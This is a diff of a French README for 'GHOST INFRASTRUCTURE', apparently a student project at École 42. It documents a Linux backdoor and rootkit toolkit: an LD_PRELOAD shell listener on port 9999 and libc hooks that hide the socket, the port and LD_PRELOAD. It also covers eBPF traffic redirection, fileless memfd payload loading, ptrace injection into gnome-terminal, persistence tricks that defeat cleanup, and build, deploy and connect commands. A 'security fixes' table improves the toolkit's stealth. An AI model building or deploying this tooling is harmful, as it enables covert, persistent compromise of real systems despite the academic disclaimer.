@@ -10,24 +10,26 @@
 ```
 ┌─────────────────────────────────────────────────────────────────┐
 │                     GHOST INFRASTRUCTURE                        │
-│                                                                 │
-│  ┌──────────────┐    ┌──────────────┐    ┌──────────────────┐  │
-│  │  Payload     │    │  Injection   │    │   Persistance    │  │
-│  │  Layer       │    │  Layer       │    │   Layer          │  │
-│  │              │    │              │    │                  │  │
-│  │ encrypt_     │───▶│ ghost_lib.c  │───▶│ survival.sh      │  │
-│  │ payload.py   │    │ (hijack.so)  │    │ master_deploy.sh│  │
-│  │ stager.py    │    │              │    │ systemd service  │  │
-│  └──────────────┘    └──────┬───────┘    └──────────────────┘  │
-│                             │                                   │
-│  ┌──────────────┐    ┌──────▼───────┐    ┌──────────────────┐  │
-│  │  BPF Layer   │    │  Delivery    │    │   Nettoyage      │  │
-│  │              │    │  Layer       │    │                  │  │
-│  │ ghost.bpf.c  │    │ ghost_swap   │    │ full.sh          │  │
-│  │ loader.c     │    │ .sh          │    │ stop_audit()     │  │
-│  │ receiver.c   │    │ ghost_deploy │    │                  │  │
-│  └──────────────┘    │ .sh          │    └──────────────────┘  │
-│                      └──────────────┘                          │
+├─────────────────────────────────────────────────────────────────┤
+│  Payload Layer                                                  │
+│  ├── encrypt_payload.py (AES-256-GCM)                         │
+│  ├── stager.py (fileless decryption + dlopen)                │
+│  └── evador.c (memfd-based loader)                            │
+├─────────────────────────────────────────────────────────────────┤
+│  Injection Layer                                               │
+│  ├── ghost_lib.c (light version, target detection)           │
+│  ├── hijack.so (full rootkit with hooks)                     │
+│  └── injector.c (ptrace-based remote injection)              │
+├─────────────────────────────────────────────────────────────────┤
+│  Persistence Layer                                             │
+│  ├── survival.sh (double-fork daemon)                        │
+│  ├── master_deploy.sh (full infrastructure)                   │
+│  └── systemd service (user-level persistence)                 │
+├─────────────────────────────────────────────────────────────────┤
+│  BPF Layer (Advanced)                                          │
+│  ├── ghost.bpf.c (sk_lookup redirection)                     │
+│  ├── loader.c (BPF loader + FD transfer)                      │
+│  └── receiver.c (ghost socket receiver)                       │
 └─────────────────────────────────────────────────────────────────┘
 ```
 
@@ -36,14 +38,15 @@
 ## Fichiers du projet
 
 | Fichier | Type | Rôle |
-|---|---|---|
+|---------|------|------|
 | `config.h` | Header C | Configuration centralisée (ports, paths, constantes) |
-| `ghost_lib.c` / `hijack.so` | Bibliothèque C | Backdoor + rootkit LD_PRELOAD (cœur du projet) |
+| `ghost_lib.c` | Bibliothèque C | Version légère avec détection de cible |
+| `hijack.so` | Bibliothèque C | Full rootkit avec tous les hooks libc |
 | `ghost.bpf.c` | eBPF | Redirection de trafic au niveau kernel |
 | `loader.c` | C | Chargeur eBPF + transfert de FD via socket Unix |
 | `receiver.c` | C | Récepteur du socket fantôme (mode ghost) |
 | `evador.c` | C | Chargement .so en mémoire via `memfd_create` |
-| `injector.c` | C | Injection ptrace complète dans processus distant |
+| `injector.c` | C | Injection ptrace dans processus distant |
 | `encrypt_payload.py` | Python | Chiffrement AES-256-GCM du payload |
 | `stager.py` | Python | Déchiffrement et exécution fileless en RAM |
 | `ghost_deploy.sh` | Bash | Déploiement via injection LD_PRELOAD |
@@ -56,59 +59,49 @@
 
 ## Techniques implémentées
 
-### 1. Backdoor via LD_PRELOAD (`ghost_lib.c`, `hijack.c`)
+### 1. Backdoor via LD_PRELOAD (`ghost_lib.c`, `hijack.so`)
 - Injection d'une shared library dans un processus cible (`gnome-terminal-server`)
 - Listener TCP sur le port 9999, spawn d'un shell interactif sur connexion
 - Masquage du process via `prctl(PR_SET_NAME, "[kworker/u24:5]")`
 - **Kill switch** : détection du fichier `/tmp/.ghost_off` pour auto-extinction
-- Détection du processus cible via `/proc/self/exe` (plus sécurisé que comm)
+- Détection du processus cible via `/proc/self/exe`
 
 ### 2. Rootkit userland (hooks libc dans `hijack.so`)
-- Hook de `readdir()` → masquage du file descriptor du socket dans `/proc/self/fd/`
-- Hook de `recvmsg()` → filtrage des réponses Netlink pour que `ss` ne voie pas le port 9999
-- Hook de `bind()` → force `SO_REUSEADDR/SO_REUSEPORT` sur tous les sockets
-- Hook de `open()` → filtrage de `/proc/self/maps` et `/proc/self/environ`
+- Hook `open()` / `openat()` → filtrage `/proc/self/maps` et `/proc/self/environ`
+- Hook `readdir()` → masquage du file descriptor du socket
+- Hook `recvmsg()` → filtrage des réponses Netlink (`ss` ne voit pas port 9999)
+- Hook `bind()` → force `SO_REUSEADDR/SO_REUSEPORT` sur tous les sockets
+- Support `openat()` avec chemins relatifs (`openat(proc_fd, "maps")`)
+- Garde O_PATH pour éviter comportement indéfini
 
 ### 3. Filtrage /proc avancé
-- `/proc/self/maps` : masque les lignes contenant le nom de la lib (`libghost`)
-- `/proc/self/environ` : filtre la variable `LD_PRELOAD=`
-- Crée des fichiers temporaires dans `/tmp/.ghost_*` pour servir les données filtrées
+- `/proc/self/maps` : masque les lignes contenant `libghost` et `/tmp/*.so`
+- `/proc/self/environ` : filtre `LD_PRELOAD=`
+- Crée des memfd anonymes via `memfd_create()` (zéro artefact disque)
 
 ### 4. Redirection réseau eBPF (`ghost.bpf.c` + `loader.c` + `receiver.c`)
-- Programme de type `sk_lookup` attaché au namespace réseau
-- Redirection forcée des paquets arrivant sur le port 9999 vers un socket fantôme
-- Transfert du file descriptor entre processus via `SCM_RIGHTS` (socket Unix)
-- Utilisation de `SO_ATTACH_BPF` pour SOCKMAP
+- Programme `sk_lookup` attaché au namespace réseau
+- Redirection forcée des paquets port 9999 vers socket fantôme
+- Transfert FD via `SCM_RIGHTS` (socket Unix)
 
 ### 5. Exécution fileless (`evador.c`, `stager.py`)
-- Création d'un fichier en RAM via `memfd_create()` (syscall 319 sur x86_64)
-- Chargement de la bibliothèque via `/proc/self/fd/<fd>` sans jamais toucher le disque
-- Le payload chiffré est déchiffré en RAM puis injecté directement
-- Maintien du handle via variable static (`keep_alive_handle`)
+- Fichier en RAM via `memfd_create()` (syscall 319)
+- Chargement via `/proc/self/fd/<fd>` sans contact disque
+- Payload chiffré déchiffré en RAM
 
-### 6. Chiffrement du payload (`encrypt_payload.py`)
-- AES-256-GCM (AEAD) via `cryptography.hazmat`
-- Nonce aléatoire de 12 octets préfixé au ciphertext
-- Authentification intégrée (auth tag GCM)
+### 6. Chiffrement (`encrypt_payload.py`)
+- AES-256-GCM via `cryptography.hazmat`
+- Nonce 12 octets + auth tag GCM
 
-### 7. Persistance et survie au logout (`survival.sh`, `master_deploy.sh`)
-- **Double-fork** : orphelin du processus parent, adopté par PID 1
-- `setsid()` : détachement du TTY de session
-- `signal(SIGHUP, SIG_IGN)` et `signal(SIGTERM, SIG_IGN)`
-- Persistance systemd user (`portal-service.service`) via `socat`
-- `loginctl enable-linger` pour survie après déconnexion
-- Lancement via `at` pour échapper au cgroup de session
+### 7. Persistance (`survival.sh`, `master_deploy.sh`)
+- Double-fork + `setsid()` + ignorance SIGHUP/SIGTERM
+- Persistance systemd user via `portal-service.service`
+- Workspaces redondants (`/var/tmp`, `/tmp`) avec pièges `-i`
 
-### 8. Anti-cleanup et redondance (`master_deploy.sh`)
-- Workspaces redondants dans `/var/tmp`, `/tmp` (4 emplacements)
-- Fichier nommé `-i` dans chaque répertoire : piège pour `rm -rf *` (déclenche le mode interactif)
-- Verrouillage des répertoires en `chmod 555` → `unlink()` impossible sur le contenu
-
-### 9. Injection ptrace (`injector.c`)
-- Injection complète de .so dans un processus distant via `PTRACE_ATTACH`
-- Manipulation des registres (RIP, RDI, RSI) pour rediriger l'exécution vers `dlopen`
-- Sauvegarde/restauration des registres originaux
-- Validation des paramètres et gestion d'erreurs robuste
+### 8. Injection ptrace (`injector.c`)
+- `PTRACE_ATTACH` + attente `SIGTRAP` via breakpoint `int3`
+- Lecture résultat `dlopen` depuis RAX
+- Sauvegarde/restauration registres et mémoire
 
 ---
 
@@ -132,92 +125,156 @@
 ## Compilation
 
 ```bash
-# Configuration centralisée
-# 编辑 config.h pour modifier les constantes
+# Build complet
+make all
 
-# Bibliothèque principale (backdoor + rootkit)
-gcc -fPIC -shared -o hijack.so ghost_lib.c -ldl -lpthread
+# Build individuel
+make hijack.so          # Full rootkit
+make ghost_lib.so       # Version légère
+make evador             # Loader fileless
+make injector           # Injection ptrace
+make receiver           # Récepteur BPF
+make ghost.bpf.o        # Programme eBPF (requiert clang)
+make loader             # Loader BPF (requiert libbpf)
 
-# Loader fileless
-gcc evador.c -o evador -ldl
+# Setup libbpf (une fois)
+make setup-libbpf
 
-# Injection ptrace
-gcc injector.c -o injector -ldl
-
-# Loader BPF (nécessite libbpf)
-git clone https://github.com/libbpf/libbpf.git
-cd libbpf/src && make OBJDIR=../build DESTDIR=../install install && cd ../..
-clang -O2 -target bpf -I./libbpf/install/usr/include -c ghost.bpf.c -o ghost.bpf.o
-gcc loader.c -o loader -I./libbpf/install/usr/include -L./libbpf/build -l:libbpf.a -lelf -lz
-
-# Receiver BPF
-gcc receiver.c -o receiver
-
-# Chiffrement du payload
-pip install cryptography
-python3 encrypt_payload.py
+# Nettoyage
+make clean
 ```
 
 ---
 
-## Usage
+## Utilisation
+
+### Déploiement standard
 
 ```bash
-# Déploiement complet
-./master_deploy.sh
-
 # Déploiement minimal (LD_PRELOAD uniquement)
 ./ghost_deploy.sh start
 ./ghost_swap.sh
 
-# Survie au logout
-./survival.sh start
-
-# Injection ptrace (nécessite CAP_SYS_PTRACE)
-gcc injector.c -o injector -ldl
-./injector <pid> /chemin/vers/lib.so
-
-# Connexion à la backdoor
-nc localhost 9999    # Ghost listener (port principal)
-nc localhost 8888    # Daemon de survie (port secondaire)
-
-# Stager fileless
-python3 stager.py -p payload.so.enc -k <cle_hex>
-
 # Vérification
 ./ghost_deploy.sh check
 
-# Nettoyage total
+# Nettoyage minimal
 ./ghost_deploy.sh stop
+```
+
+### Persistence avancées
+
+```bash
+# Survie au logout (double-fork daemon)
+./survival.sh start
 ./survival.sh stop
+
+# Déploiement complet infrastructure
+./master_deploy.sh
+
+# Nettoyage total
 ./full.sh
-touch /tmp/.ghost_off   # Kill switch intégré
+touch /tmp/.ghost_off   # Kill switch
+```
+
+### Injection ptrace
+
+```bash
+# Compilation (si make non utilisé)
+gcc -Wall -Wextra -o injector injector.c -ldl
+
+# Injection dans processus distant
+# Nécessite CAP_SYS_PTRACE ou root
+./injector <pid> /chemin/vers/lib.so
+
+# Exemple
+./injector $(pgrep -f gnome-terminal) /tmp/libghost.so
+```
+
+### Connexion backdoor
+
+```bash
+# Shell interactif
+nc localhost 9999
+
+# Port secondaire (daemon survie)
+nc localhost 8888
+```
+
+### Payload fileless
+
+```bash
+# Chiffrement
+pip install cryptography
+python3 encrypt_payload.py hijack.so
+
+# Exécution fileless
+python3 stager.py -p hijack.so.enc -k <cle_hex_a_32_caracteres>
 ```
 
 ---
 
-## Corrections de sécurité appliquées
+## Corrections de sécurité (v5.2)
 
 | Problème | Fichier | Correction |
-|---|---|---|
-| Fuite d'adresse dlopen | `injector.c` | Résolution locale, pas de fuite |
-| Pas de validation des params | `injector.c` | Validation pid/chemin |
-| Erreurs non gérées | `evador.c` | Vérification complète des retours |
-| Clé hardcodée | `stager.py` | Passage en argument CLI |
-| Integer overflow | `evador.c` | Vérification allocation |
-| /proc/maps exposé | `ghost_lib.c`, `hijack.c` | Hook open() avec filtrage |
-| /proc/environ exposé | `ghost_lib.c`, `hijack.c` | Filtrage LD_PRELOAD |
+|----------|---------|------------|
+| Race condition post-unlock | `ghost_lib.c`, `hijack.c` | Pattern mutex→memfd→unlock→retour FD |
+| Buffer overflow boucle copie | `ghost_lib.c`, `hijack.c` | Vérification `(dst-filtered)` dans boucle interne |
+| usleep non déterministe | `injector.c` | Attente SIGTRAP via breakpoint int3 |
+| Bypass openat chemin relatif | `ghost_lib.c`, `hijack.c` | Détection dirfd→/proc/<pid>/ via readlink |
+| O_PATH non géré | `ghost_lib.c`, `hijack.c` | Garde early-return pour O_PATH |
+| Fuite FD sur erreur | `ghost_lib.c`, `hijack.c` | Fermeture systématique dans create_filtered_memfd |
+| Contention mutex | `ghost_lib.c`, `hijack.c` | Mutex séparés environ/maps |
 
 ---
 
 ## Prérequis
 
 - Linux x86_64 (kernel ≥ 5.9 pour eBPF sk_lookup)
-- `gcc`, `clang`, `libbpf`, `libelf`, `zlib`
+- `gcc`, `clang`, `libbpf`, `libelf`, `zlib`, `make`
 - Python 3 + `cryptography` (`pip install cryptography`)
-- `CAP_NET_ADMIN` pour l'attachement eBPF
-- `CAP_SYS_PTRACE` pour l'injection ptrace
-- Environnement GNOME (pour les vecteurs `gnome-terminal-server`)
+- `CAP_NET_ADMIN` pour eBPF
+- `CAP_SYS_PTRACE` pour injection distante
+- Environnement GNOME (cible `gnome-terminal-server`)
+
+---
+
+## Fonctionnement interne
+
+### Hooks libc (`hijack.so`)
+
+```
+open("/proc/self/maps") → filter_maps_create_fd() → memfd_create() → return fd
+open("/proc/self/environ") → filter_environ_create_fd() → memfd_create() → return fd
+readdir() → skip entry if d_name == ghost_fd
+recvmsg() → skip netlink if sport == 9999
+bind() → setsockopt(SO_REUSEADDR|SO_REUSEPORT)
+```
+
+### Filtrage /proc avec mutex
+
+```c
+// Pattern sécurisé v5.2
+pthread_mutex_lock(&maps_mutex);
+// ... lecture /proc et filtrage ...
+int fd = create_filtered_memfd(filtered, total);  // memfd SOUS mutex
+pthread_mutex_unlock(&maps_mutex);
+return fd;  // Retour FD, pas de pointeur buffer
+```
+
+### Injection ptrace
+
+```
+1. PTRACE_ATTACH → waitpid(WIFSTOPPED)
+2. GETREGS → sauvegarde
+3. POKEDATA chemin → inject_path()
+4. POKETEXT int3 breakpoint → breakpoint地址
+5. SETREGS (RIP=dlopen, RDI=chemin, RSI=RTLD_LAZY)
+6. CONT → attend SIGTRAP
+7. waitpid() → lit RAX pour résultat dlopen
+8. POKETEXT restaure octet original
+9. SETREGS restauration + DETACH
+```
 
 ---
 
@@ -225,3 +282,16 @@ touch /tmp/.ghost_off   # Kill switch intégré
 
 > Ces outils sont développés dans un cadre strictement académique (École 42 — spécialisation cybersécurité).  
 > Leur utilisation en dehors d'un environnement de lab isolé ou sans autorisation explicite est illégale.
+
+---
+
+## Glossaire
+
+| Terme | Définition |
+|-------|------------|
+| LD_PRELOAD | Mécanisme Linux pour intercepter appels libc |
+| memfd | File descriptor en RAM (pas de fichier disque) |
+| SCM_RIGHTS | Passage de file descriptors via socket Unix |
+| sk_lookup | Hook eBPF pour interception trafic réseau |
+| ASLR | Randomisation des adresses mémoire |
+| RTLD_NEXT | Symbole "suivant" dans ordre libraries |
